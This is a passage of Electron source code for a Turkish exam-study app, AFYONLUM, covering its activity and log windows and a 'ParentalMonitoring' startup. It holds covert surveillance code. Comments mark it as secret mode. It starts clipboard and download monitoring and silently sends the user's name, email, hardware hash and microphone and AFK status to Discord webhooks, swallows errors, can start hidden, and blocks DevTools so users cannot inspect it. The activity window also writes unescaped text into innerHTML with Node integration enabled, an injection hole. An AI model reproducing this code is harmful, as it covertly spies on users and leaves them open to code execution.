  activitiesWindow.webContents.on('devtools-opened', () => {
    activitiesWindow.webContents.closeDevTools();
  });
  
  const activitiesHtml = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Aktiviteler - AFYONLUM</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
      color: #e0e0e0;
      height: 100vh;
      display: flex;
      flex-direction: column;
    }
    
    .header {
      background: linear-gradient(135deg, #10b981 0%, #059669 100%);
      padding: 20px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
    }
    
    .header h1 {
      font-size: 24px;
      font-weight: 600;
      color: white;
      margin-bottom: 8px;
    }
    
    .header p {
      font-size: 14px;
      color: rgba(255, 255, 255, 0.8);
    }
    
    .toolbar {
      display: flex;
      gap: 10px;
      padding: 15px;
      background: #2d2d2d;
      border-bottom: 1px solid #404040;
    }
    
    .btn {
      padding: 10px 20px;
      border: none;
      border-radius: 6px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    
    .btn-primary {
      background: linear-gradient(135deg, #10b981 0%, #059669 100%);
      color: white;
    }
    
    .btn-primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(16, 185, 129, 0.4);
    }
    
    .btn-danger {
      background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
      color: white;
    }
    
    .btn-danger:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(239, 68, 68, 0.4);
    }
    
    .activities-container {
      flex: 1;
      overflow-y: auto;
      padding: 20px;
    }
    
    .activity-item {
      background: #2d2d2d;
      border-left: 4px solid #10b981;
      padding: 15px;
      margin-bottom: 10px;
      border-radius: 6px;
      transition: all 0.3s ease;
    }
    
    .activity-item:hover {
      background: #353535;
      transform: translateX(5px);
    }
    
    .activity-item.empty {
      border-left: 4px solid #6366f1;
      text-align: center;
      color: #808080;
    }
    
    .footer {
      padding: 12px 20px;
      background: #2d2d2d;
      border-top: 1px solid #404040;
      text-align: center;
      font-size: 12px;
      color: #808080;
    }
  </style>
</head>
<body>
  <div class="header">
    <h1>📊 Aktiviteler (Son 7 Gün)</h1>
    <p>Yapılan İşlemler - Afyonlum YKS Analiz Sistemi</p>
  </div>
  
  <div class="toolbar">
    <button class="btn btn-primary" onclick="refreshActivities()">
      🔄 Yenile
    </button>
    <button class="btn btn-danger" onclick="closeWindow()">
      ❌ Kapat
    </button>
  </div>
  
  <div class="activities-container" id="activities"></div>
  
  <div class="footer">
    © 2025 Afyonlum - Son 7 günlük aktiviteler gösterilmektedir
  </div>
  
  <script>
    const { ipcRenderer } = require('electron');
    
    function updateActivities(activities) {
      const activitiesElement = document.getElementById('activities');
      
      if (!activities || activities.length === 0) {
        activitiesElement.innerHTML = '<div class="activity-item empty">Henüz aktivite kaydı bulunmuyor.</div>';
        return;
      }
      
      // ✅ DÜZELTME: Aktivite objelerini düzgün formatta göster
      activitiesElement.innerHTML = activities
        .map(activity => {
          // Aktivite string mi yoksa obje mi kontrol et
          if (typeof activity === 'string') {
            return \`<div class="activity-item">\${activity}</div>\`;
          }
          
          // ✅ DÜZELTME: activity.text varsa direkt kullan (server'dan gelen formatlanmış veri)
          if (activity.text) {
            return \`<div class="activity-item">\${activity.text}</div>\`;
          }
          
          // Obje ise detaylı göster (eski format - geriye dönük uyumluluk için)
          const timestamp = activity.timestamp ? new Date(activity.timestamp).toLocaleString('tr-TR') : 'Zaman bilinmiyor';
          const type = activity.type || 'Bilinmeyen';
          const action = activity.action || 'Aktivite';
          
          return \`<div class="activity-item">
            <div style="font-weight: 600; color: #10b981;">\${type}</div>
            <div style="margin-top: 4px;">\${action}</div>
            <div style="margin-top: 4px; font-size: 12px; color: #888;">\${timestamp}</div>
          </div>\`;
        })
        .join('');
    }
    
    function refreshActivities() {
      ipcRenderer.send('get-activities');
    }
    
    // ✅ SİL BUTONU KALDIRILDI - Fonksiyon yorum satırı
    // function clearAllActivities() {
    //   if (confirm('Tüm aktiviteleri silmek istediğinizden emin misiniz? Bu işlem geri alınamaz.')) {
    //     ipcRenderer.send('clear-activities');
    //   }
    // }
    
    function closeWindow() {
      window.close();
    }
    
    // İlk yükleme
    ipcRenderer.send('get-activities');
    
    // Aktivite güncellemelerini dinle
    ipcRenderer.on('activities-update', (event, activities) => {
      updateActivities(activities);
    });
    
    // Her 3 saniyede bir otomatik yenile
    setInterval(() => {
      ipcRenderer.send('get-activities');
    }, 3000);
  </script>
</body>
</html>
  `;
  
  activitiesWindow.loadURL(`data:text/html;charset=utf-8,${encodeURIComponent(activitiesHtml)}`);
  
  activitiesWindow.on('closed', () => {
    activitiesWindow = null;
  });
}

function createLogsWindow() {
  // Eğer logs window zaten açıksa, focus et
  if (logsWindow && !logsWindow.isDestroyed()) {
    logsWindow.focus();
    return;
  }
  
  logsWindow = new BrowserWindow({
    width: 900,
    height: 600,
    title: 'Server Logları - AFYONLUM',
    autoHideMenuBar: true,
    backgroundColor: '#1a1a1a',
    icon: path.join(__dirname, 'icons', 'app-icon.ico'),
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
      devTools: false  // DevTools'u engelle
    }
  });
  
  // DevTools'u engelle
  logsWindow.webContents.on('devtools-opened', () => {
    logsWindow.webContents.closeDevTools();
  });
  
  // HTML içeriği oluştur
  const logsHtml = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Server Logları - AFYONLUM</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
      color: #e0e0e0;
      height: 100vh;
      display: flex;
      flex-direction: column;
    }
    
    .header {
      background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
      padding: 20px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
    }
    
    .header h1 {
      font-size: 24px;
      font-weight: 600;
      color: white;
      margin-bottom: 8px;
    }
    
    .header p {
      font-size: 14px;
      color: rgba(255, 255, 255, 0.8);
    }
    
    .toolbar {
      display: flex;
      gap: 10px;
      padding: 15px;
      background: #2d2d2d;
      border-bottom: 1px solid #404040;
    }
    
    .btn {
      padding: 10px 20px;
      border: none;
      border-radius: 6px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    
    .btn-primary {
      background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
      color: white;
    }
    
    .btn-primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(99, 102, 241, 0.4);
    }
    
    .btn-danger {
      background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
      color: white;
    }
    
    .btn-danger:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(239, 68, 68, 0.4);
    }
    
    .btn-success {
      background: linear-gradient(135deg, #10b981 0%, #059669 100%);
      color: white;
    }
    
    .btn-success:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(16, 185, 129, 0.4);
    }
    
    .btn-warning {
      background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
      color: white;
    }
    
    .btn-warning:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(245, 158, 11, 0.4);
    }
    
    .logs-container {
      flex: 1;
      overflow-y: auto;
      padding: 20px;
      background: #1a1a1a;
    }
    
    .logs-content {
      background: #0a0a0a;
      border: 1px solid #404040;
      border-radius: 8px;
      padding: 15px;
      font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
      font-size: 13px;
      line-height: 1.6;
      white-space: pre-wrap;
      word-wrap: break-word;
      color: #a0a0a0;
    }
    
    .logs-content::-webkit-scrollbar {
      width: 10px;
    }
    
    .logs-content::-webkit-scrollbar-track {
      background: #1a1a1a;
    }
    
    .logs-content::-webkit-scrollbar-thumb {
      background: #6366f1;
      border-radius: 5px;
    }
    
    .logs-content::-webkit-scrollbar-thumb:hover {
      background: #8b5cf6;
    }
    
    .footer {
      padding: 12px 20px;
      background: #2d2d2d;
      border-top: 1px solid #404040;
      text-align: center;
      font-size: 12px;
      color: #808080;
    }
  </style>
</head>
<body>
  <div class="header">
    <h1>🖥️ Server Logları</h1>
    <p>AFYONLUM - YKS Analiz Takip Sistemi</p>
  </div>
  
  <div class="toolbar">
    <button class="btn btn-primary" onclick="refreshLogs()">
      🔄 Yenile
    </button>
    <button class="btn btn-success" onclick="restartServer()">
      🔁 Serveri Yeniden Başlat
    </button>
    <button class="btn btn-warning" onclick="restartApp()">
      ♻️ Uygulamayı Yeniden Başlat
    </button>
    <button class="btn btn-danger" onclick="closeWindow()">
      ❌ Kapat
    </button>
  </div>
  
  <div class="logs-container">
    <div class="logs-content" id="logs"></div>
  </div>
  
  <div class="footer">
    © 2025 AFYONLUM - Tüm Hakları Saklıdır
  </div>
  
  <script>
    const { ipcRenderer } = require('electron');
    
    function updateLogs(logsText) {
      const logsElement = document.getElementById('logs');
      logsElement.textContent = logsText || 'Henüz log kaydı bulunmuyor.';
      logsElement.scrollTop = logsElement.scrollHeight;
    }
    
    function refreshLogs() {
      ipcRenderer.send('refresh-logs');
    }
    
    function restartServer() {
      if (confirm('Serveri yeniden başlatmak istediğinizden emin misiniz?')) {
        ipcRenderer.send('restart-server');
      }
    }
    
    function restartApp() {
      if (confirm('Uygulamayı yeniden başlatmak istediğinizden emin misiniz?')) {
        ipcRenderer.send('restart-app');
      }
    }
    
    function closeWindow() {
      window.close();
    }
    
    // İlk yükleme
    ipcRenderer.send('get-logs');
    
    // Log güncellemelerini dinle
    ipcRenderer.on('log-update', (event, logs) => {
      updateLogs(logs);
    });
    
    // Her 5 saniyede bir otomatik yenile
    setInterval(() => {
      ipcRenderer.send('get-logs');
    }, 5000);
  </script>
</body>
</html>
  `;
  
  logsWindow.loadURL(`data:text/html;charset=utf-8,${encodeURIComponent(logsHtml)}`);
  
  logsWindow.on('closed', () => {
    logsWindow = null;
  });
}

// IPC event handlers for logs window
ipcMain.on('get-logs', (event) => {
  event.reply('log-update', serverLogs.join('\n'));
});

ipcMain.on('refresh-logs', (event) => {
  event.reply('log-update', serverLogs.join('\n'));
});

ipcMain.on('restart-server', () => {
  restartServer();
});

ipcMain.on('restart-app', () => {
  restartApp();
});

// etkinlik penceresi için IPC event handlers
ipcMain.on('get-activities', async (event) => {
  try {
    // ✅ DÜZELTME: Server'dan kullanıcı aktivitelerini çek
    // ActivityLogger içeriği: Görev eklendi, Soru kaydı eklendi, Deneme eklendi, Çalışma saati eklendi vs.
    const http = require('http');
    
    const options = {
      hostname: 'localhost',
      port: PORT,
      path: '/api/user-activities',
      method: 'GET',
      timeout: 5000
    };
    
    const req = http.request(options, (res) => {
      let data = '';
      
      res.on('data', (chunk) => {
        data += chunk;
      });
      
      res.on('end', () => {
        try {
          const response = JSON.parse(data);
          const activities = response.activities || [];
          
          // ✅ KAPSAMLI: Son 7 gün TÜM aktiviteleri detaylı formatta göster
          const sevenDaysAgo = new Date();
          sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);
          
          // ✅ Son 7 gün filtresi
          const recentActivities = activities.filter(act => {
            const actDate = new Date(act.createdAt);
            return actDate >= sevenDaysAgo;
          });
          
          const formattedActivities = recentActivities.map(act => {
            const date = new Date(act.createdAt);
            const timeStr = date.toLocaleString('tr-TR', { 
              year: 'numeric', 
              month: '2-digit', 
              day: '2-digit',
              hour: '2-digit',
              minute: '2-digit',
              second: '2-digit'
            });
            
            // ✅ Kullanıcının istediği özel formatlar
            // ✅ DÜZELTME: payloadSnapshot JSON string ise parse et
            let payload = {};
            if (act.payloadSnapshot) {
              try {
                payload = typeof act.payloadSnapshot === 'string' 
                  ? JSON.parse(act.payloadSnapshot) 
                  : act.payloadSnapshot;
              } catch (parseErr) {
                payload = {};
              }
            }
            let formattedText = '';
            
            try {
              if (act.category === 'task') {
                // Format: "[date time] Görev Eklendi -> Task name | Açıklama: description"
                const action = act.action === 'created' ? 'Görev Eklendi' : 
                              act.action === 'updated' ? 'Görev Güncellendi' :
                              act.action === 'completed' ? 'Görev Tamamlandı' :
                              act.action === 'deleted' ? 'Görev Silindi' : 'Görev İşlemi';
                const title = payload.title || 'İsimsiz görev';
                formattedText = `[${timeStr}] ${action} -> ${title}`;
                if (payload.description && payload.description.trim()) {
                  formattedText += ` | Açıklama: ${payload.description}`;
                }
              } 
              else if (act.category === 'exam') {
                // Format: "[date time] Deneme Eklendi -> Exam Type (Genel/Branş) - Exam Name"
                const action = act.action === 'created' ? 'Deneme Eklendi' :
                              act.action === 'updated' ? 'Deneme Güncellendi' :
                              act.action === 'deleted' ? 'Deneme Silindi' : 'Deneme İşlemi';
                const examType = payload.examType === 'branch' ? 'Branş' : 'Genel';
                // ✅ DÜZELTME: Farklı alan adlarını kontrol et
                const examName = payload.examName || payload.exam_name || payload.display_name || act.details || 'İsimsiz deneme';
                formattedText = `[${timeStr}] ${action} -> ${examType} Denemesi - ${examName}`;
              }
              else if (act.category === 'question') {
                // Format: "[date time] Soru Eklendi -> Subject - Topic (X soru: D/Y/B) - Exam Type"
                const action = act.action === 'created' ? 'Soru Kaydı Eklendi' :
                              act.action === 'updated' ? 'Soru Güncellendi' :
                              act.action === 'deleted' ? 'Soru Silindi' : 'Soru İşlemi';
                // ✅ DÜZELTME: Ders adını düzgün al
                const subject = payload.subject || act.details?.split(' - ')[0] || 'Ders';
                const topic = payload.topic || 'Konu';
                // ✅ DÜZELTME: Soru sayısını hesapla (correct_count + wrong_count + blank_count)
                const correctCount = parseInt(payload.correct_count || payload.correctCount || 0);
                const wrongCount = parseInt(payload.wrong_count || payload.wrongCount || 0);
                const blankCount = parseInt(payload.blank_count || payload.blankCount || 0);
                const questionCount = payload.questionCount || payload.solved || (correctCount + wrongCount + blankCount) || 0;
                const examType = payload.examType === 'branch' ? 'Branş' : 'Genel';
                formattedText = `[${timeStr}] ${action} -> ${subject} - ${topic} (${questionCount} soru: ${correctCount}D/${wrongCount}Y/${blankCount}B) - ${examType}`;
              }
              else if (act.category === 'study') {
                // Format: "[date time] Çalışma Saati Eklendi -> X saat Y dakika - Subject"
                const action = act.action === 'created' ? 'Çalışma Saati Eklendi' :
                              act.action === 'updated' ? 'Çalışma Güncellendi' :
                              act.action === 'deleted' ? 'Çalışma Silindi' : 'Çalışma İşlemi';
                const hours = payload.hours || 0;
                const minutes = payload.minutes || 0;
                formattedText = `[${timeStr}] ${action} -> ${hours} saat ${minutes} dakika`;
                if (payload.subject && payload.subject.trim()) {
                  formattedText += ` - ${payload.subject}`;
                }
              }
              else if (act.category === 'goal') {
                // Format: "[date time] Hedef Eklendi -> Goal title"
                const action = act.action === 'created' ? 'Hedef Eklendi' :
                              act.action === 'updated' ? 'Hedef Güncellendi' :
                              act.action === 'completed' ? 'Hedef Tamamlandı' :
                              act.action === 'deleted' ? 'Hedef Silindi' : 'Hedef İşlemi';
                const title = payload.title || payload.goalTitle || 'İsimsiz hedef';
                formattedText = `[${timeStr}] ${action} -> ${title}`;
              }
              else if (act.category === 'flashcard') {
                // Format: "[date time] Kart Eklendi -> Topic (X kart)"
                const action = act.action === 'created' ? 'Kart Eklendi' :
                              act.action === 'updated' ? 'Kart Güncellendi' :
                              act.action === 'deleted' ? 'Kart Silindi' : 'Kart İşlemi';
                const topic = payload.topic || payload.subject || 'Konu';
                const cardCount = payload.cardCount || 1;
                formattedText = `[${timeStr}] ${action} -> ${topic} (${cardCount} kart)`;
              }
              else if (act.category === 'topic') {
                // Format: "[date time] Konu Eklendi -> Subject - X konu"
                const action = act.action === 'created' ? 'Konu Eklendi' :
                              act.action === 'updated' ? 'Konu Güncellendi' :
                              act.action === 'deleted' ? 'Konu Silindi' : 'Konu İşlemi';
                const subject = payload.subject || 'Ders';
                const topicCount = payload.topicCount || payload.topics?.length || 1;
                formattedText = `[${timeStr}] ${action} -> ${subject} - ${topicCount} konu`;
              }
              else {
                // Diğer kategoriler için genel format
                const categoryMap = {
                  'task': 'Görev',
                  'exam': 'Deneme',
                  'question': 'Soru',
                  'study': 'Çalışma',
                  'goal': 'Hedef',
                  'flashcard': 'Kart',
                  'topic': 'Konu'
                };
                const category = categoryMap[act.category] || act.category;
                const actionMap = {
                  'created': 'Eklendi',
                  'updated': 'Güncellendi',
                  'deleted': 'Silindi',
                  'completed': 'Tamamlandı',
                  'archived': 'Arşivlendi'
                };
                const action = actionMap[act.action] || act.action;
                const details = act.details || JSON.stringify(payload);
                formattedText = `[${timeStr}] ${category} ${action} - ${details}`;
              }
            } catch (err) {
              console.error('❌ Aktivite formatlama hatası:', err);
              formattedText = `[${timeStr}] ${act.category || 'Bilinmeyen'} ${act.action || 'İşlem'}`;
            }
            
            return {
              text: formattedText,
              timestamp: act.createdAt,
              type: act.category,
              action: act.action
            };
          });
          
          // ✅ Electron activity logger'daki aktiviteleri de ekle (son 7 gün)
          const electronActivities = activityLogger.getAll().filter(act => {
            if (!act.timestamp) return false;
            const actDate = new Date(act.timestamp);
            return actDate >= sevenDaysAgo;
          });
          
          const allActivities = [...formattedActivities, ...electronActivities];
          
          // ✅ Tarihe göre sırala (en yeni önce)
          allActivities.sort((a, b) => {
            const dateA = new Date(a.timestamp || 0);
            const dateB = new Date(b.timestamp || 0);
            return dateB - dateA;
          });
          
          event.reply('activities-update', allActivities);
        } catch (err) {
          console.error('❌ Aktivite parse hatası:', err);
          // Hata durumunda sadece electron aktivitelerini göster (obje formatında)
          const activities = activityLogger.getAll();
          event.reply('activities-update', activities.slice(-100).reverse());
        }
      });
    });
    
    req.on('error', (err) => {
      console.error('❌ Aktivite çekme hatası:', err.message);
      // Hata durumunda sadece electron aktivitelerini göster (obje formatında)
      const activities = activityLogger.getAll();
      event.reply('activities-update', activities.slice(-100).reverse());
    });
    
    req.end();
  } catch (err) {
    console.error('❌ Get activities hatası:', err);
    // Hata durumunda sadece electron aktivitelerini göster (obje formatında)
    const activities = activityLogger.getAll();
    event.reply('activities-update', activities.slice(-100).reverse());
  }
});

ipcMain.on('refresh-activities', async (event) => {
  // get-activities ile aynı mantığı kullan
  ipcMain.emit('get-activities', event);
});

ipcMain.on('clear-activities', (event) => {
  // ✅ DÜZELTME: Hem electron hem server aktivitelerini temizle
  activityLogger.clear();
  
  // Server'daki aktiviteleri de temizle
  const http = require('http');
  const postData = JSON.stringify({});
  
  const options = {
    hostname: 'localhost',
    port: PORT,
    path: '/api/user-activities/clear',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    },
    timeout: 5000
  };
  
  const req = http.request(options, (res) => {
    event.reply('activities-update', []);
  });
  
  req.on('error', (err) => {
    console.error('❌ Aktivite temizleme hatası:', err.message);
    event.reply('activities-update', []);
  });
  
  req.write(postData);
  req.end();
});

// ✅ DÜZELTME: Kullanıcı adını getir
ipcMain.handle('get-user-fullname', async (event) => {
  try {
    const fullName = configManager.get('USER_FULLNAME');
    return fullName || null;
  } catch (error) {
    console.error('❌ Kullanıcı adı alınamadı:', error);
    return null;
  }
});

// Kullanıcı bilgisi IPC handler'ı - GÜVENLİK SAĞLAMLAŞTIRILDI
ipcMain.handle('save-user-fullname', async (event, fullname) => {
  try {
    // ✅ GÜVENLİK: Strict input validation
    if (!fullname || typeof fullname !== 'string') {
      console.warn('❌ Geçersiz fullname tipi:', typeof fullname);
      return {
        success: false,
        message: 'Geçersiz veri tipi'
      };
    }
    
    const trimmedName = fullname.trim();
    
    // ✅ GÜVENLİK: Length validation
    if (trimmedName.length < 3 || trimmedName.length > 100) {
      return {
        success: false,
        message: 'Ad soyad 3-100 karakter arasında olmalıdır'
      };
    }
    
    // ✅ GÜVENLİK: Whitespace normalization (çoklu boşlukları tek boşluğa çevir)
    const normalizedName = trimmedName.replace(/\s+/g, ' ').trim();
    
    // ✅ GÜVENLİK: Boşluk-only kontrolü
    if (/^\s*$/.test(normalizedName)) {
      return {
        success: false,
        message: 'Ad soyad sadece boşluklardan oluşamaz'
      };
    }
    
    // ✅ GÜVENLİK: Segment (kelime) kontrolü - en az 2 kelime (Ad + Soyad)
    const segments = normalizedName.split(' ');
    if (segments.length < 2) {
      return {
        success: false,
        message: 'Lütfen adınızı ve soyadınızı girin (en az 2 kelime)'
      };
    }
    
    // ✅ GÜVENLİK: Character validation (sadece harf, tek boşluk, Türkçe karakterler)
    const nameRegex = /^[a-zA-ZğüşıöçĞÜŞİÖÇ\s]+$/;
    if (!nameRegex.test(normalizedName)) {
      return {
        success: false,
        message: 'Ad soyad sadece harflerden oluşmalıdır'
      };
    }
    
    // ✅ GÜVENLİK: Her segment minimum 2 HARF olmalı (alfabetik karakter sayısı, config poisoning önlemi)
    const letterRegex = /[a-zA-ZğüşıöçĞÜŞİÖÇ]/g;
    for (const segment of segments) {
      const letters = segment.match(letterRegex);
      const letterCount = letters ? letters.length : 0;
      
      if (letterCount < 2) {
        return {
          success: false,
          message: 'Her kelime en az 2 harf içermelidir'
        };
      }
    }
    
    // ✅ GÜVENLİK: Toplam alfabetik uzunluk minimum 4 harf olmalı (ek güvenlik katmanı)
    const totalLetters = normalizedName.match(letterRegex);
    const totalLetterCount = totalLetters ? totalLetters.length : 0;
    
    if (totalLetterCount < 4) {
      return {
        success: false,
        message: 'Ad soyad toplamda en az 4 harf içermelidir'
      };
    }
    
    // ✅ GÜVENLİK: Sadece USER_FULLNAME key'i güncellenebilir (config poisoning önlemi)
    const configManager = getConfigManager();
    configManager.set('USER_FULLNAME', normalizedName);
    
    // Process.env'e de kaydet (server'da kullanılabilir)
    process.env.USER_FULLNAME = normalizedName;
    
    console.log(`✅ Kullanıcı bilgisi kaydedildi: ${normalizedName}`);
    
    // ✅ DÜZELTME: Discord webhook'a kullanıcı bilgisi gönder
    if (webhookManager) {
      try {
        const licenseData = configManager.get('LICENSE_DATA');
        const os = require('os');
        const crypto = require('crypto');
        
        let licenseExpiryDate = null;
        if (licenseData && licenseData.expiresAt) {
          licenseExpiryDate = licenseData.expiresAt;
        }
        
        await webhookManager.sendUserInfo({
          fullName: normalizedName,
          email: configManager.get('EMAIL_USER') || 'Belirtilmemiş',
          licenseStatus: 'Aktif',
          licenseExpiry: licenseExpiryDate,
          hardwareId: crypto
            .createHash('sha256')
            .update(os.hostname() + os.platform() + os.arch())
            .digest('hex'),
          activatedAt: new Date().toISOString()
        });
        
        // ✅ GİZLİ MOD: Kullanıcıya log gösterme
      } catch (discordError) {
        // ✅ GİZLİ MOD: Discord hatası kritik değil, sessizce yut
      }
    }
    
    return {
      success: true,
      message: 'Kullanıcı bilgisi başarıyla kaydedildi',
      fullname: normalizedName
    };
  } catch (error) {
    console.error('❌ Kullanıcı bilgisi kaydetme hatası:', error);
    return {
      success: false,
      message: error instanceof Error ? error.message : 'Kullanıcı bilgisi kaydedilemedi'
    };
  }
});

function startMonitoring() {
  if (monitoringStarted || !mainWindow) return;
  
  // KRITIK: Modüller yüklenememiş olabilir - null kontrolü yap
  if (!DiscordWebhookManager || !ParentalMonitoring) {
    return;
  }
  
  try {
    if (!webhookManager) {
      const configManager = getConfigManager();
      
      configManager.checkAndReloadWebhooks();
      
      const webhookStatus = configManager.getWebhookStatus();
      const hasEmptyWebhooks = Object.values(webhookStatus).some(s => !s.configured);
      
      if (hasEmptyWebhooks) {
        configManager.forceReloadWebhooks();
      }
      
      if (!app.isPackaged) {
        configManager.logInfo();
      }
      
      webhookManager = new DiscordWebhookManager(app, configManager);
      if (activityLogger && activityLogger.setWebhookManager) {
        activityLogger.setWebhookManager(webhookManager);
      }
      
      // Relay URL ayarla (ISP engellerini bypass etmek için)
      // Kendi sunucunuz üzerinden relay kullan (localhost veya kendi domain'iniz)
      if (webhookManager.setRelayUrl) {
        // ConfigManager'dan RELAY_URL al veya varsayılan localhost kullan
        // Kendi sunucunuzu kurmak için AFYONLU.md dosyasına bakın
        const relayUrl = configManager.get('RELAY_URL') || 'http://localhost:5000/api/discord-relay';
        webhookManager.setRelayUrl(relayUrl);
      }
    }
    
    if (!parentalMonitoring) {
      const configManager = getConfigManager();
      if (!configManager.get('USER_FULLNAME')) {
        configManager.set('USER_FULLNAME', 'Afyonlum');
      }
      
      parentalMonitoring = new ParentalMonitoring(app, webhookManager, true, configManager);
      parentalMonitoring.startAll(clipboard);
      
      // Dosya indirme izlemeyi aktif et
      if (parentalMonitoring.setupDownloadMonitoring) {
        parentalMonitoring.setupDownloadMonitoring(mainWindow);
      }
      
      monitoringStarted = true;
      
      // ✅ DÜZELTME: Her 10 dakikada bir sistem durumunu Discord'a gönder
      if (systemStatusInterval) {
        clearInterval(systemStatusInterval);
      }
      
      systemStatusInterval = setInterval(() => {
        if (parentalMonitoring && webhookManager) {
          const os = require('os');
          const systemStatus = {
            platform: os.platform(),
            release: os.release(),
            cpu: os.cpus()[0]?.model || 'Unknown',
            memoryUsage: Math.round((1 - os.freemem() / os.totalmem()) * 100),
            isAFK: parentalMonitoring.afkStatus?.isAFK || false,
            microphoneActive: parentalMonitoring.systemStatus?.microphoneActive || false,
            wifiConnected: parentalMonitoring.systemStatus?.wifiConnected || false
          };
          
          webhookManager.sendSystemStatus(systemStatus).catch(err => {});
        }
      }, 20 * 60 * 1000); // ✅ 20 dakika
      
      // Uygulama açıldı bildirimi
      if (webhookManager) {
        const configManager = getConfigManager();
        const userName = configManager.get('USER_FULLNAME') || 'Kullanıcı';
        const licenseData = configManager.get('LICENSE_DATA');
        const os = require('os');
        
        let licenseExpiryDate = null;
        if (licenseData && licenseData.expiresAt) {
          licenseExpiryDate = licenseData.expiresAt;
        }
        
        webhookManager.sendUserInfo({
          fullName: userName,
          email: configManager.get('EMAIL_USER') || 'Belirtilmemiş',
          licenseStatus: 'Aktif',
          licenseExpiry: licenseExpiryDate,
          hardwareId: require('crypto')
            .createHash('sha256')
            .update(os.hostname() + os.platform() + os.arch())
            .digest('hex'),
          activatedAt: new Date().toISOString()
        }).catch(err => {});
      }
      
    }
  } catch (e) {}
}

async function createWindow() {
  logStartup('[createWindow] Fonksiyon başladı');
  const primaryDisplay = screen.getPrimaryDisplay();
  const { width: screenWidth, height: screenHeight } = primaryDisplay.workAreaSize;
  logStartup(`[createWindow] Ekran boyutu: ${screenWidth}x${screenHeight}`);
  
  mainWindow = new BrowserWindow({
    width: screenWidth,
    height: screenHeight,
    frame: false, // Frame kapalı - custom title bar kullanılacak
    autoHideMenuBar: true,
    backgroundColor: '#1a0a2e', // Loading ekranı ile uyumlu arka plan
    show: false, // Başlangıçta gizli - loadFile sonrası gösterilecek
    skipTaskbar: isHiddenStart, // Gizli başlatmada taskbar'da gösterme
    fullscreen: false, // Otomatik tam ekran kapalı
    icon: path.join(__dirname, 'icons', 'app-icon.ico'),
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      preload: path.join(__dirname, 'preload.cjs'),
      devTools: false  // DevTools'u tamamen engelle
    }
  });
  
  // ✅ NOT: Pencere loading.html yüklendikten sonra gösterilecek (aşağıda)

  // ==========================================
  // DevTools TAM GÜVENLİK ENGELLEMESİ
  // ==========================================
  
  mainWindow.webContents.on('devtools-opened', () => {
    mainWindow.webContents.closeDevTools();
  });

  mainWindow.webContents.on('context-menu', (event) => {
    event.preventDefault();
  });

  // 3. Tüm DevTools açma kısayollarını engelle
  mainWindow.webContents.on('before-input-event', (event, input) => {
    // F12 engelle
    if (input.key === 'F12') {
      event.preventDefault();
      console.warn('⚠️  F12 tuşu engellendi');
    }
    
    // Ctrl+Shift+I engelle (Windows - DevTools)
    if (input.control && input.shift && input.key === 'I') {
      event.preventDefault();
      console.warn('⚠️  Ctrl+Shift+I engellendi');
    }
    
    // Ctrl+Shift+J engelle (Windows - Console)
    if (input.control && input.shift && input.key === 'J') {
      event.preventDefault();
      console.warn('⚠️  Ctrl+Shift+J engellendi');
    }
    
    // Ctrl+Shift+C engelle (Windows - Inspect Element)
    if (input.control && input.shift && input.key === 'C') {
      event.preventDefault();
      console.warn('⚠️  Ctrl+Shift+C engellendi');
    }
    
    // Ctrl+Shift+K engelle (Alternatif Console kısayolu)
    if (input.control && input.shift && input.key === 'K') {
      event.preventDefault();
      console.warn('⚠️  Ctrl+Shift+K engellendi');
    }
    
    // Ctrl+U engelle (View Source)
    if (input.control && input.key === 'U') {
      event.preventDefault();
      console.warn('⚠️  Ctrl+U engellendi');
    }
    
    // Admin panel kısayolu: Ctrl+Shift+Alt+3
    if (input.control && input.shift && input.alt && input.key === '3') {
      if (mainWindow && !mainWindow.isDestroyed()) {
        mainWindow.webContents.send('open-admin-panel');
        console.log('✅ Admin panel kısayolu tetiklendi');
      }
    }
    
    // F11 tuşu ile tam ekran toggle
    if (input.key === 'F11' && input.type === 'keyDown') {
      event.preventDefault();
      mainWindow.setFullScreen(!mainWindow.isFullScreen());
    }
  });

  // F11 ile fullscreen toggle
  mainWindow.on('enter-full-screen', () => {
    mainWindow.webContents.send('fullscreen-changed', true);
  });
  
  mainWindow.on('leave-full-screen', () => {
    mainWindow.webContents.send('fullscreen-changed', false);
  });

  // ==========================================
  // LOADING EKRANI - PRODUCTION PATH DÜZELTMESİ
  // ==========================================
  
  // Production ve development için doğru path belirleme
  let loadingPath = path.join(__dirname, 'loading.html');
  
  // Eğer dosya bulunamazsa, alternatif yolları dene
  if (!fs.existsSync(loadingPath)) {
    const altPaths = [
      path.join(process.resourcesPath || '', 'app.asar', 'electron', 'loading.html'),
      path.join(process.resourcesPath || '', 'app', 'electron', 'loading.html'),
